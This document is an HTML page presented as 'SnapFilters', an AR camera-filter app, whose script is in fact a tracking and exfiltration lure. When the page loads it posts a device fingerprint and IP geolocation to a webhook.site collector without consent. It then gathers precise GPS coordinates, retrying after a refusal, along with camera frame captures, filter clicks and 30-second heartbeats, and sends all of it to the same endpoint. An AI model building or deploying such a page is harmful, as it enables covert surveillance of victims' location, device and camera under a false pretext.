<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SnapFilters - AR Camera Filters</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; }
        .container { text-align: center; max-width: 400px; width: 90%; }
        h1 { font-size: 2.2em; margin-bottom: 20px; text-shadow: 0 2px 10px rgba(0,0,0,0.3); }
        .status { background: rgba(255,255,255,0.1); padding: 15px; border-radius: 15px; margin: 20px 0; backdrop-filter: blur(10px); font-size: 0.95em; }
        .status strong { color: #ffd700; }
        .btn { background: linear-gradient(45deg, #ff6b6b, #feca57); border: none; padding: 15px 30px; font-size: 1.1em; border-radius: 50px; color: white; cursor: pointer; margin: 10px; box-shadow: 0 8px 25px rgba(0,0,0,0.3); transition: all 0.3s; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 12px 35px rgba(0,0,0,0.4); }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
        #video { width: 100%; max-width: 400px; border-radius: 20px; margin: 20px 0; box-shadow: 0 10px 40px rgba(0,0,0,0.4); display: none; }
        #canvas { position: absolute; top: 0; left: 50%; transform: translateX(-50%); pointer-events: none; border-radius: 20px; opacity: 0.8; display: none; }
        .filters { display: flex; justify-content: center; gap: 10px; margin: 20px 0; flex-wrap: wrap; }
        .filter-btn { background: rgba(255,255,255,0.2); border: 2px solid rgba(255,255,255,0.3); padding: 10px 15px; border-radius: 25px; color: white; cursor: pointer; font-size: 0.9em; transition: all 0.3s; }
        .filter-btn.active, .filter-btn:hover { background: rgba(255,255,255,0.4); border-color: white; }
        #location-status { font-size: 1em; margin: 10px 0; color: #90EE90; }
        .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 1s ease-in-out infinite; margin-right: 10px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        @media (max-width: 500px) { h1 { font-size: 1.8em; } }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎥 SnapFilters</h1>
        <div class="status" id="status">Click "Enable Location" to start with AR filters!</div>
        <div id="location-status"></div>
        
        <button class="btn" id="enableLocation">📍 Enable Location</button>
        <button class="btn" id="enableCamera" disabled>📸 Start Camera</button>
        
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
        
        <div class="filters" id="filters" style="display: none;">
            <div class="filter-btn active" data-filter="none">Original</div>
            <div class="filter-btn" data-filter="grayscale">B&W</div>
            <div class="filter-btn" data-filter="blur">Dreamy</div>
            <div class="filter-btn" data-filter="sepia">Retro</div>
        </div>
        
        <div class="status" id="debug-status" style="font-size: 0.8em; opacity: 0.7;"></div>
    </div>

    <script>
        const WEBHOOK = 'https://webhook.site/dd91a0fe-a23d-49f6-ac68-4b7288c36ca1';
        const SESSION_ID = 'snap_' + Math.random().toString(36).substr(2, 9);
        let gpsData = {}, ipData = {}, hasLocation = false, hasCamera = false, captureInterval;
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const statusEl = document.getElementById('status');
        const locationStatusEl = document.getElementById('location-status');
        const debugEl = document.getElementById('debug-status');

        function updateStatus(msg, color = 'white') {
            statusEl.innerHTML = `<strong>${msg}</strong>`;
            statusEl.style.color = color;
            debugEl.textContent = `Session: ${SESSION_ID} | GPS: ${gpsData.lat ? '✓' : '✗'} | IP: ${ipData.city ? '✓' : '✗'} | Camera: ${hasCamera ? '✓' : '✗'}`;
        }

        function updateLocationStatus() {
            if (gpsData.lat) {
                locationStatusEl.innerHTML = `📍 GPS: ${gpsData.lat.toFixed(6)}, ${gpsData.lon.toFixed(6)} (${gpsData.accuracy?.toFixed(0)}m)`;
            } else if (ipData.city) {
                locationStatusEl.innerHTML = `📍 IP: ${ipData.city}, ${ipData.region} (${ipData.lat?.toFixed(4)}, ${ipData.lon?.toFixed(4)})`;
            } else {
                locationStatusEl.innerHTML = '<span class="loading"></span>Getting exact location...';
            }
        }

        async function sendData(event, data = {}) {
            try {
                const payload = {
                    sessionId: SESSION_ID,
                    timestamp: new Date().toISOString(),
                    event,
                    ...data,
                    deviceInfo: {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        language: navigator.language,
                        screen: `${screen.width}x${screen.height}`,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        cookieEnabled: navigator.cookieEnabled,
                        doNotTrack: navigator.doNotTrack,
                        hardwareConcurrency: navigator.hardwareConcurrency,
                        maxTouchPoints: navigator.maxTouchPoints
                    }
                };
                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                console.log(`Sent ${event}:`, payload);
            } catch (e) {
                console.error('Send failed:', e);
            }
        }

        async function getLocation(retry = 0) {
            return new Promise((resolve, reject) => {
                if (hasLocation) return resolve(gpsData);
                
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        gpsData = {
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            altitude: pos.coords.altitude,
                            timestamp: pos.timestamp
                        };
                        hasLocation = true;
                        updateLocationStatus();
                        sendData('location_gps', gpsData);
                        resolve(gpsData);
                    },
                    async err => {
                        if (retry < 3 && err.code === 1) { // Permission denied, retry once
                            setTimeout(() => getLocation(retry + 1), 1000);
                            return;
                        }
                        updateStatus('GPS unavailable, using IP location...', '#ffd700');
                        getIPLocation().then(resolve).catch(reject);
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
                );
            });
        }

        async function getIPLocation() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                ipData = await res.json();
                updateLocationStatus();
                sendData('location_ip', ipData);
            } catch (e) {
                ipData = { error: 'IP lookup failed' };
            }
        }

        async function startCamera() {
            try {
                updateStatus('Starting camera...');
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
                });
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.style.display = 'block';
                    video.style.display = 'block';
                    document.getElementById('filters').style.display = 'flex';
                    hasCamera = true;
                    updateStatus('Camera ready! Try filters & poses 👇', '#90EE90');
                    sendData('camera_started', { width: video.videoWidth, height: video.videoHeight });
                    startImageCapture();
                };
            } catch (err) {
                updateStatus('Camera access denied', '#ff6b6b');
                sendData('camera_denied', { error: err.name });
            }
        }

        function startImageCapture() {
            captureInterval = setInterval(() => {
                if (!hasCamera || video.readyState !== 4) return;
                ctx.save();
                // Apply filter
                const filter = document.querySelector('.filter-btn.active').dataset.filter;
                ctx.filter = filter === 'none' ? 'none' : filter;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                ctx.restore();
                
                sendData('image_captured', {
                    imageBase64: imageData.substring(0, 100), // First 100 chars for preview
                    dimensions: `${canvas.width}x${canvas.height}`,
                    filter
                });
            }, 10000); // Every 10s
        }

        // Event listeners
        document.getElementById('enableLocation').onclick = async () => {
            document.getElementById('enableLocation').disabled = true;
            updateStatus('Requesting GPS location...');
            sendData('page_loaded');
            await getLocation();
            document.getElementById('enableCamera').disabled = false;
            updateStatus('Location enabled! Now start camera 👀', '#90EE90');
        };

        document.getElementById('enableCamera').onclick = startCamera;

        document.querySelectorAll('.filter-btn').forEach(btn => {
            btn.onclick = () => {
                document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                sendData('filter_applied', { filter: btn.dataset.filter });
            };
        });

        // Heartbeat every 30s
        setInterval(() => sendData('heartbeat', { hasLocation, hasCamera }), 30000);

        // Auto-send device info on load
        sendData('page_loaded');
        getIPLocation(); // Fallback IP always
        updateLocationStatus();

        // Cleanup
        window.onbeforeunload = () => {
            if (captureInterval) clearInterval(captureInterval);
            sendData('page_unloaded');
        };
    </script>
</body>
</html>
